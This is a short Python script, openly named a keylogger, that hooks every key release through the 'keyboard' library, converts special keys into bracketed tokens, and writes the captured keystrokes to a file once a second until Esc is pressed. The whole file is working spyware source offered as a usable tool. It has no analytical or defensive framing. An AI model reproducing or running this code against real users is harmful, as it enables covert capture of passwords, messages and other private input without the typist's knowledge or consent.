import argparse
import keyboard
import os
from threading import Semaphore, Timer

#argument suport
parser = argparse.ArgumentParser()
parser.add_argument("-o","--output",required=True,help="Name of the output file")
args = vars(parser.parse_args())

class Keylogger():
  def __init__(self):
    #reads inputs
    self.log = ""
    #write out file 
    self.out = open(args["output"],"a")
    #thread
    self.Semaphore = Semaphore(0)

  def callback(self,event):
    name = event.name
    if len(name) > 1:
      if name == "space":
        name = " "
      elif name == "enter":
        name = "[ENTER]\n"
      elif name == "decimal":
        name = "."
      elif name == "esc":
        self.out.close()
        os._exit(1)
      else:
        name = name.replace(" ", "_")
        name = f"[{name.upper()}]"

    self.log += name

  def report(self):
    if self.log:
      self.out.write(self.log)
    self.log = ""
    Timer(interval=1.0,function=self.report).start()

  def start(self):
    keyboard.on_release(callback=self.callback)
    self.report()
    self.Semaphore.acquire()

if __name__ == '__main__':
  keylogger = Keylogger()
  keylogger.start()
